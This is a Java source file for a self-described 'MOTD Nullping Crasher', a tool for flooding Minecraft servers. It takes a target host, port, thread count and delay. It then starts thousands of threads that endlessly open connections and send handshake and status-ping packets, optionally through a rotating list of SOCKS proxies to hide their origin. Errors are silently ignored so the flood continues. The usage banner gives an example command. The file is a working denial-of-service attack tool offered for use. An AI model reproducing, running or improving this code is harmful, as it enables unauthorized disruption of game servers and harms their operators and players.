package me.nzxter.motdnullping;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.Reader;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.net.SocketAddress;
import java.util.ArrayList;
import java.util.List;

public class MOTDNullPing {
    public static MinecraftPing ping;
    public static MinecraftPingOptions options;
        
      
    public static void main(String[] args) {
        if (args.length == 5) {
            try {
            	MOTDNullPing.pingThreadCrasher(args[0], Integer.valueOf(args[1]), Integer.valueOf(args[2]), Long.valueOf(args[3]), Boolean.valueOf(args[4]));
            }
            catch (NumberFormatException e) {
                System.out.println("The Port/Thread/Delay/proxies");
            }
        } else {
            System.out.println("<------------------------------------------------------------------------->");
            System.out.println("                      MOTD Nullping Crasher by Nzxter F.M                       ");
            System.out.println("");
            System.out.println("");
            System.out.println("Usage: java -jar motdnullping.jar IP/Domain PORT THREADS DELAY proxies");
            System.out.println("Example: java -jar motdnullping.jar 1.1.1.1/example.net 25565 2500 3 true/false");
            System.out.println("");
            System.out.println("");
            System.out.println("<------------------------------------------------------------------------->");
        }
    }
    


        
        public static void pingThreadCrasher(String ip, int port, int threads, Long delay, boolean use) {  
	        options = new MinecraftPingOptions();
	        options.setHostname(ip);
	        options.setPort(port);
	        ArrayList<Proxy> proxies = new ArrayList<Proxy>();
	        if (use) {
	            try {
	                String s;
	                BufferedReader br = new BufferedReader(new FileReader(new File("proxies.txt")));
	                while ((s = br.readLine()) != null) {
	                    String paddress = s.split(":")[0];
	                    int pport = Integer.parseInt(s.split(":")[1]);
	                    Proxy p = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress(paddress, pport));
	                    proxies.add(p);
	                }
	                br.close();
	            }
	            catch (Exception br) {
	                // empty catch block
	            }
	        }
	        for (int i = 0; i < threads; ++i) {
	            new Thread(() -> {
	                do {
	                    try {
	                        do {
	                            if (use) {
	                                for (Proxy proxy : proxies) {
	                                	MinecraftPing.getPingString(options, proxy);
	                                }
	                            } else {
	                            	MinecraftPing.getPingString(options);
	                            }
	                            Thread.sleep(delay);
	                        } while (true);
	                    }
	                    catch (Exception exception) {
	                        continue;
	                    }
	                } while (true);
	            }).start();
	        }
	    }

    public static class MinecraftPingUtil {
        public static byte PACKET_HANDSHAKE = 0;
        public static byte PACKET_STATUSREQUEST = 0;
        public static byte PACKET_PING = 1;
        public static int PROTOCOL_VERSION = 4;
        public static int STATUS_HANDSHAKE = 1;

        public static void validate(Object o, String m) {
            if (o == null) {
                throw new RuntimeException(m);
            }
        }

        public static void io(boolean b, String m) throws IOException {
            if (b) {
                throw new IOException(m);
            }
        }

        public static int readVarInt(DataInputStream in) throws IOException {
            byte k;
            int i = 0;
            int j = 0;
            do {
                k = in.readByte();
                i |= (k & 127) << j++ * 7;
                if (j <= 5) continue;
                throw new RuntimeException("VarInt too big");
            } while ((k & 128) == 128);
            return i;
        }

        public static void writeVarInt(DataOutputStream out, int paramInt) throws IOException {
            while ((paramInt & -128) != 0) {
                out.writeByte(paramInt & 127 | 128);
                paramInt >>>= 7;
            }
            out.writeByte(paramInt);
        }
    }

    public static class MinecraftPingOptions {
        private String hostname;
        private int port = 25565;
        private int timeout = 5000;
        private String charset = "UTF-8";

        public MinecraftPingOptions setHostname(String hostname) {
            this.hostname = hostname;
            return this;
        }

        public MinecraftPingOptions setPort(int port) {
            this.port = port;
            return this;
        }

        public MinecraftPingOptions setTimeout(int timeout) {
            this.timeout = timeout;
            return this;
        }

        public MinecraftPingOptions setCharset(String charset) {
            this.charset = charset;
            return this;
        }

        public String getHostname() {
            return this.hostname;
        }

        public int getPort() {
            return this.port;
        }

        public int getTimeout() {
            return this.timeout;
        }

        public String getCharset() {
            return this.charset;
        }
    }

    public static class MinecraftPing {
        public static String[] getPingString(MinecraftPingOptions options, Proxy proxy) throws IOException, InterruptedException {
            MinecraftPingUtil.validate(options.getHostname(), "Hostname cannot be null.");
            MinecraftPingUtil.validate(options.getPort(), "Port cannot be null.");
            Socket socket = new Socket(proxy);
            socket.connect(new InetSocketAddress(options.getHostname(), options.getPort()), options.getTimeout());
            Thread.sleep(2000L);
            DataInputStream in = new DataInputStream(socket.getInputStream());
            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
            ByteArrayOutputStream handshake_bytes = new ByteArrayOutputStream();
            DataOutputStream handshake = new DataOutputStream(handshake_bytes);
            handshake.writeByte(MinecraftPingUtil.PACKET_HANDSHAKE);
            MinecraftPingUtil.writeVarInt(handshake, MinecraftPingUtil.PROTOCOL_VERSION);
            MinecraftPingUtil.writeVarInt(handshake, options.getHostname().length());
            handshake.writeBytes(options.getHostname());
            handshake.writeShort(options.getPort());
            MinecraftPingUtil.writeVarInt(handshake, MinecraftPingUtil.STATUS_HANDSHAKE);
            MinecraftPingUtil.writeVarInt(out, handshake_bytes.size());
            out.write(handshake_bytes.toByteArray());
            out.writeByte(1);
            out.writeByte(MinecraftPingUtil.PACKET_STATUSREQUEST);
            MinecraftPingUtil.readVarInt(in);
            int id = MinecraftPingUtil.readVarInt(in);
            MinecraftPingUtil.io(id == -1, "Server prematurely ended stream.");
            MinecraftPingUtil.io(id != MinecraftPingUtil.PACKET_STATUSREQUEST, "Server returned invalid packet.");
            int length = MinecraftPingUtil.readVarInt(in);
            MinecraftPingUtil.io(length == -1, "Server prematurely ended stream.");
            MinecraftPingUtil.io(length == 0, "Server returned unexpected value.");
            byte[] data = new byte[length];
            in.readFully(data);
            String json = new String(data, options.getCharset());
            out.writeByte(9);
            out.writeByte(MinecraftPingUtil.PACKET_PING);
            out.writeLong(System.currentTimeMillis());
            MinecraftPingUtil.readVarInt(in);
            id = MinecraftPingUtil.readVarInt(in);
            MinecraftPingUtil.io(id == -1, "Server prematurely ended stream.");
            MinecraftPingUtil.io(id != MinecraftPingUtil.PACKET_PING, "Server returned invalid packet.");
            handshake.close();
            handshake_bytes.close();
            out.close();
            in.close();
            socket.close();
            String[] returnValue = new String[5];
            try {
                try {
                    returnValue[0] = json.split("\"description\":\"")[1].split("\",")[0];
                }
                catch (Exception var13) {
                    returnValue[0] = json.split("\"description\":")[1].split("\"text\":\"")[1].split("\"")[0];
                }
                returnValue[1] = json.split("\"players\":")[1].split("\"max\":")[1].split(",")[0];
                returnValue[2] = json.split("\"players\":")[1].split("\"online\":")[1].split("}")[0].split(",")[0];
                returnValue[3] = json.split("\"version\":")[1].split("\"name\":\"")[1].split("\"")[0];
                returnValue[4] = json.split("\"version\":")[1].split("\"protocol\":")[1].split("}")[0].split(",")[0];
            }
            catch (Exception var14) {
                returnValue = null;
            }
            return returnValue;
        }

        public static String[] getPingString(MinecraftPingOptions options) throws IOException, InterruptedException {
            MinecraftPingUtil.validate(options.getHostname(), "Hostname cannot be null.");
            MinecraftPingUtil.validate(options.getPort(), "Port cannot be null.");
            Socket socket = new Socket();
            socket.connect(new InetSocketAddress(options.getHostname(), options.getPort()), options.getTimeout());
            Thread.sleep(2000L);
            DataInputStream in = new DataInputStream(socket.getInputStream());
            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
            ByteArrayOutputStream handshake_bytes = new ByteArrayOutputStream();
            DataOutputStream handshake = new DataOutputStream(handshake_bytes);
            handshake.writeByte(MinecraftPingUtil.PACKET_HANDSHAKE);
            MinecraftPingUtil.writeVarInt(handshake, MinecraftPingUtil.PROTOCOL_VERSION);
            MinecraftPingUtil.writeVarInt(handshake, options.getHostname().length());
            handshake.writeBytes(options.getHostname());
            handshake.writeShort(options.getPort());
            MinecraftPingUtil.writeVarInt(handshake, MinecraftPingUtil.STATUS_HANDSHAKE);
            MinecraftPingUtil.writeVarInt(out, handshake_bytes.size());
            out.write(handshake_bytes.toByteArray());
            out.writeByte(1);
            out.writeByte(MinecraftPingUtil.PACKET_STATUSREQUEST);
            MinecraftPingUtil.readVarInt(in);
            int id = MinecraftPingUtil.readVarInt(in);
            MinecraftPingUtil.io(id == -1, "Server prematurely ended stream.");
            MinecraftPingUtil.io(id != MinecraftPingUtil.PACKET_STATUSREQUEST, "Server returned invalid packet.");
            int length = MinecraftPingUtil.readVarInt(in);
            MinecraftPingUtil.io(length == -1, "Server prematurely ended stream.");
            MinecraftPingUtil.io(length == 0, "Server returned unexpected value.");
            byte[] data = new byte[length];
            in.readFully(data);
            String json = new String(data, options.getCharset());
            out.writeByte(9);
            out.writeByte(MinecraftPingUtil.PACKET_PING);
            out.writeLong(System.currentTimeMillis());
            MinecraftPingUtil.readVarInt(in);
            id = MinecraftPingUtil.readVarInt(in);
            MinecraftPingUtil.io(id == -1, "Server prematurely ended stream.");
            MinecraftPingUtil.io(id != MinecraftPingUtil.PACKET_PING, "Server returned invalid packet.");
            handshake.close();
            handshake_bytes.close();
            out.close();
            in.close();
            socket.close();
            String[] returnValue = new String[5];
            try {
                try {
                    returnValue[0] = json.split("\"description\":\"")[1].split("\",")[0];
                }
                catch (Exception var13) {
                    returnValue[0] = json.split("\"description\":")[1].split("\"text\":\"")[1].split("\"")[0];
                }
                returnValue[1] = json.split("\"players\":")[1].split("\"max\":")[1].split(",")[0];
                returnValue[2] = json.split("\"players\":")[1].split("\"online\":")[1].split("}")[0].split(",")[0];
                returnValue[3] = json.split("\"version\":")[1].split("\"name\":\"")[1].split("\"")[0];
                returnValue[4] = json.split("\"version\":")[1].split("\"protocol\":")[1].split("}")[0].split(",")[0];
            }
            catch (Exception var14) {
                returnValue = null;
            }
            return returnValue;
        }
    }

}

